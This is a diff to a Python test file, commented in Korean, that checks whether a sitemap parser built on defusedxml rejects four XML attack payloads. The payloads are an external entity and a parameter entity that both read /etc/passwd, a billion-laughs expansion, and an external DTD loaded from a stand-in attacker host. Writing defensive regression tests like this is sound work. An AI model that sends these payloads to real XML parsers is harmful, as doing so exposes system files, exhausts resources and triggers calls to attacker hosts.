@@ -114,28 +114,66 @@ def test_discover_uniform_custom_keyword_overrides_default():
 # ===== PR-B: defusedxml XXE 보호 회귀 =====
 
 
-def test_fetch_sitemap_index_rejects_external_entity_payload():
-    """PR-B (code-reviewer Major #2): defusedxml 이 외부 entity 참조를 차단한다.
-
-    stdlib xml.etree.ElementTree 는 XXE / billion laughs 에 취약. defusedxml 로 교체했으므로
-    XXE payload 가 EntitiesForbidden / DefusedXmlException 으로 거부되어야 한다.
-    """
-    xxe_payload = (
+# PR-B (code-reviewer Major #2 + test-writer M1): defusedxml 이 외부 XML attack vector 를
+# 차단한다. stdlib xml.etree 는 모든 vector 에 취약 — 4종 vector parametrize 로 회귀 보호.
+_XXE_VECTORS = [
+    pytest.param(
         '<?xml version="1.0"?>\n'
         '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
         '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
         '  <sitemap><loc>&xxe;</loc></sitemap>\n'
-        '</sitemapindex>'
-    )
+        '</sitemapindex>',
+        id="external_entity",
+    ),
+    pytest.param(
+        # billion laughs — 재귀 entity expansion (DoS)
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE foo [\n'
+        '  <!ENTITY a "lol">\n'
+        '  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n'
+        '  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n'
+        ']>\n'
+        '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
+        '  <sitemap><loc>&c;</loc></sitemap>\n'
+        '</sitemapindex>',
+        id="billion_laughs",
+    ),
+    pytest.param(
+        # external DTD 참조 (네트워크 호출 유도)
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE foo SYSTEM "http://attacker.example/evil.dtd">\n'
+        '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
+        '  <sitemap><loc>http://example/</loc></sitemap>\n'
+        '</sitemapindex>',
+        id="external_dtd",
+    ),
+    pytest.param(
+        # parameter entity — DTD 안에서 entity 정의 자체에 외부 참조
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE foo [\n'
+        '  <!ENTITY % pe SYSTEM "file:///etc/passwd">\n'
+        '  %pe;\n'
+        ']>\n'
+        '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
+        '</sitemapindex>',
+        id="parameter_entity",
+    ),
+]
 
+
+@pytest.mark.parametrize("payload", _XXE_VECTORS)
+def test_fetch_sitemap_index_rejects_xxe_attack_vectors(payload):
+    """defusedxml 이 4종 XML attack vector 를 모두 차단한다.
+
+    각 vector 가 raise 하는 exception 의 정확한 클래스명은 defusedxml 버전 의존 —
+    module 또는 클래스 이름으로 검증.
+    """
     client = KreamClient()
     with requests_mock.Mocker() as m:
-        m.get(f"{KREAM_BASE}/sitemap.xml", text=xxe_payload)
+        m.get(f"{KREAM_BASE}/sitemap.xml", text=payload)
         with pytest.raises(Exception) as exc_info:
             fetch_sitemap_index(client)
 
-        # defusedxml 의 EntitiesForbidden / DefusedXmlException — 정확한 클래스명은 버전 의존이라
-        # module 또는 클래스 이름으로 검증
         exc_module = type(exc_info.value).__module__
         exc_name = type(exc_info.value).__name__
         assert "defusedxml" in exc_module or "Forbidden" in exc_name, (
